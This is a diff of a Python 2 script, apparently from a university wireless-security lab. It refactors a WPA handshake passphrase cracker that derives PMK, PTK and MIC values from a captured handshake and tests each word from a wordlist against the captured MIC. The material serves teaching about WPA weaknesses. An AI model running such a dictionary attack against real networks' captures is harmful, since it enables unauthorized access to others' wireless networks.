@@ -30,35 +30,16 @@ wpa=rdpcap("wpa_handshake.cap")
 passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 
-
-
-
-
 ssid        = wpa[0].info
 APmac       = a2b_hex(wpa[0].addr2.replace(":",""))
 Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))
 ANonce      = (wpa[5].load)[13:45]
 SNonce      = (wpa[6].load)[13:45]
-
-
-mic_to_test = b2a_hex((wpa[8].load)[77:93])
+micOriginal = b2a_hex((wpa[8].load)[77:93])
 
 B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
 data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
-
-print "\n\nValues used to derivate keys"
-print "============================"
-print "Passphrase: ",passPhrase,"\n"
-print "SSID: ",ssid,"\n"
-print "AP Mac: ",b2a_hex(APmac),"\n"
-print "CLient Mac: ",b2a_hex(Clientmac),"\n"
-print "AP Nonce: ",b2a_hex(ANonce),"\n"
-print "Client Nonce: ",b2a_hex(SNonce),"\n"
-
-
-
-
 
 def customPRF512(key,A,B):
     """
@@ -73,8 +54,29 @@ def customPRF512(key,A,B):
         R = R+hmacsha1.digest()
     return R[:blen]
 
-def generateKey(passPhrase):
-	
+def testWord(passPhrase):
+	"""
+	This function take a passphrase, generate the mic and say if its equal to orignal
+	or not.
+	"""
+
+	micToCompare = generateMic(passPhrase)
+
+	print "Passphrase testée: " + passPhrase
+	print "================================================"
+	print "Mic original: " + micOriginal
+	print "Mic à comparer: " + micToCompare
+
+	if micToCompare == micOriginal:
+		print "La passphrase utilisée est correcte !\n"
+	else:
+		print "Echec: essayer avec une nouvelle passphrase !\n"
+
+def generateMic(passPhrase):
+	"""
+	This function generate a mic from a passphrase.
+	"""
+
 	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
 	pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
 
@@ -84,40 +86,23 @@ def generateKey(passPhrase):
 	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
 	mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
-	micToCompare = mic.hexdigest()[:32]
+	mic = mic.hexdigest()[:32]
 
-	print micToCompare
-	print mic_to_test
+	return mic
 
-	if micToCompare == mic_to_test:
-		print "good my friend"
-	else:
-		print "Not good my friend"
+def testWordList():
 
-	
+	#This function test each passphrase from a word list
 
-
-	#print "\nResults of the key expansion"
-	#print passPhrase
-	#print "============================="
-	#print "PMK:\t\t",pmk,"\n"
-	#print "PTK:\t\t",b2a_hex(ptk),"\n"
-	#print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
-	#print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
-	#print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
-	#print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
-	#print "MIC:\t\t",micToCompare,"\n"
-
-def bruteforce():
     # Open the UNIX dictonary of words.
     with open('words.txt', 'r') as f:
-        words = f.read().split()
+    	words = f.read().split()
 
     # Loop over all the words.
     for word in words:
-	generateKey(word)
+		testWord(word)
 
-bruteforce()
-generateKey(passPhrase)
+# Execute the script
+testWordList()
 
 
